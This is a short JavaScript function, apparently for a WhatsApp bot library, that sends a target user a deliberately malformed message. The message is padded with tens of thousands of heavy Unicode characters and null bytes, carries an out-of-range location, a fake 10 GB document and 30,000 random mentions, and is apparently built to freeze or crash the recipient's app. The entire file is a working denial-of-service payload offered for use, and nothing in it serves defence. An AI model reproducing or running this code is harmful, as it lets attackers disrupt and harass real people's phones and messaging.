async function delayapcb(target) {
  try {
    let message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: " ",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.03499999999999,
                degreesLongitude: 922.999999999999,
                name: "bang paket" + "ꦾ".repeat(45000),
                address: "×",
              },
            },
            body: {
              text: "X-delay" + "ꦾ".repeat(45000),
            },
            nativeFlowMessage: {
              messageParamsJson: "\u0000".repeat(10000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 30000 },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                ),
              ],
              quotedMessage: {
                documentMessage: {
                  fileName: "coreXdelay.js",
                  mimetype: "text/plain",
                  fileLength: 10000000000,
                  caption: "coreXdelay",
                  pageCount: 1,
                  mediaKey: "\u0000".repeat(90),
                  jpegThumbnail: Buffer.from(""),
                },
              },
            },
          },
        },
      },
    };

    await sock.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  } catch (e) {
    console.log(e);
  }
}